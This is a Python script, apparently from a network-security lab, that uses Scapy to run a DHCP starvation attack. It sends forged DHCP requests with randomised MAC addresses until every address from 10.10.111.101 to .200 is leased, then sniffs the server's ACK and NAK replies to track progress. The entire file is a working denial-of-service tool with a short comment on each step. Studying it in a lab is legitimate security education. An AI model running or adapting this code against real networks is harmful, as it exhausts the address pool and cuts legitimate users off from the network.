
from scapy.all import *
from time import sleep 
from threading import Thread


#The class DHCP_Starve_Store will maintain the MAC address along with the IP Addresses which are ranging from 10.10.111.100 to 10.10.111.200

class DHCP_Starve_Store(object):
    def __init__(self):
        self.mac = [""]
        self.ip = []

# The method dhcp_requestHandle is used to handle the ACK and the NAK packets
#10.10.111.100 IP is registered for the Kali linux, so it will ignored
    def dhcp_requestHandle(self,pkt):
    	if pkt[DHCP]:
        # if the DHCP server will reply with the ACK, then the requested IP address is registered
            if pkt[DHCP].options[0][1]==5:
            	# Adding the IPs to the list
            	self.ip.append(pkt[IP].dst)  
            	print str(pkt[IP].dst)+" registered"
            	print "The ACK Packet is Sent."
        	
            elif pkt[DHCP].options[0][1]==6:        # Due to packet loss, we may get duplicate ACK
            	print "The NAK is received."
            
# The dhcp_sniff method is used to sniff the DHCP packets
    def dhcp_sniff(self):
        sniff(filter="udp and (port 67 or port 68)",prn=self.dhcp_requestHandle,store=0)

# The begin method will now start with the process of starvation    
    def begin(self):
    	thread = Thread(target=self.dhcp_sniff)
    	thread.start()
    	print "Beginning the DHCP Starvation process:"
    	while len(self.ip) < 100:
        	self.dhcp_starve()
# The process completes    
    	print "All the IPs ranging from 100-200 are Starved."

# The dhcp_starve method will now send the DHCP requests in a loop     
    def dhcp_starve(self):
# We are starting from 1 since 100 is already registered to Kali 
        for i in range(1,101):                          
            requested_ip_addr = "10.10.111."+str(100+i)
            #If Ip is alredy registered then we will skip it
            if requested_ip_addr in self.ip:
                continue
            # It will generate the MAC address and will avoid any duplication
            mac_add = ""
            while mac_add in self.mac:
                mac_add = RandMAC()
            self.mac.append(mac_add)

            # DHCP request packet is being generated
            pkt = Ether(src = mac_add, dst = "ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr= RandString(12, '0123456789abcdef'))/DHCP(options=[("message-type","request"),("requested_addr",requested_ip_addr),("server_id", "10.10.111.1"),"end"])
            # the packet is sent
            sendp(pkt)
            print "Trying to starve "+requested_ip_addr
            sleep(0.5)                      # it is used to to avoid congestion


if __name__=="__main__":
    starvation = DHCP_Starve_Store()
    starvation.begin()
    
        
      

